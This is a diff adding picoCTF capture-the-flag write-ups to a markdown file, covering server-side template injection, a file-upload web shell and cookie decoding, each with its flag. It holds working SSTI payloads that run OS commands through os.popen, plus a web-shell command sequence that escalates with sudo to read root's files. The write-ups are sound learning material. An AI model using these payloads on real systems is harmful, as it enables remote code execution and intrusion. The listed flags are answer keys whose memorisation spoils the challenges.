@@ -1,4 +1,4 @@
-# Easy Challenges
+![image](https://github.com/user-attachments/assets/4bc0cc3a-510d-4be9-b7a0-e4d369c3bc02)![image](https://github.com/user-attachments/assets/c01a91c5-2d41-4c98-9876-912216a5e280)# Easy Challenges
 
 ## Web Decode
 
@@ -177,6 +177,67 @@
 ![image](https://github.com/user-attachments/assets/02ae531c-7e9f-4bcc-a53d-4f43b0da8d0d)
 
 **Flag:** picoCTF{ca1cu1at1ng_Mach1n3s_8028f}
+
+## SSTI1
+
+**Categories:** SSTI (Server-side Template Injection)
+
+![image](https://github.com/user-attachments/assets/640a6caa-8025-433b-895a-bfdc57221ded)
+
+**Payloads used:**
+```
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
+```
+
+![image](https://github.com/user-attachments/assets/10723518-aba9-4ce9-8a2e-242c82e708c5)
+
+**Btw**, I used this github page for the payloads:
+
+https://github.com/payloadbox/ssti-payloads
+
+**Flag:** picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
+
+## n0s4n1ty 1
+
+**Categories:** file upload vulnerability, magic bytes, web shell, command injection
+
+![image](https://github.com/user-attachments/assets/4adf219a-4740-485e-bc71-1b9e6134f8f9)
+
+![image](https://github.com/user-attachments/assets/91fcbaab-82a6-4c8a-a603-2433bc32c60b)
+
+![image](https://github.com/user-attachments/assets/76191c33-634d-4a12-8bde-2e4ab49891cf)
+
+**Commands used:**
+
+```
+whoami
+ls
+ls ..
+ls ../..
+ls ../../..
+ls ../../../..
+sudo -l
+sudo ls ../../../../root
+sudo cat ../../../../root/flag.txt
+```
+
+![image](https://github.com/user-attachments/assets/f49f1d0f-596d-4465-bfb0-950531dd43f1)
+
+**Flag:** picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
+
+## Cookie Monster Secret Recipe
+
+**Categories:** inspect source, cryptography (just a bit)
+
+![image](https://github.com/user-attachments/assets/f318cea1-6f17-4064-ba08-b48737265c87)
+
+![image](https://github.com/user-attachments/assets/7cb85089-0998-484e-ae4d-527706f23b2c)
+
+**Note:** Don't ask me why I used Burp to decode that, it was just conveniently open lmao
+
+**Flag:** picoCTF{c00k1e_m0nster_l0ves_c00kies_057BCB51}
 
 # Medium Challenges
 
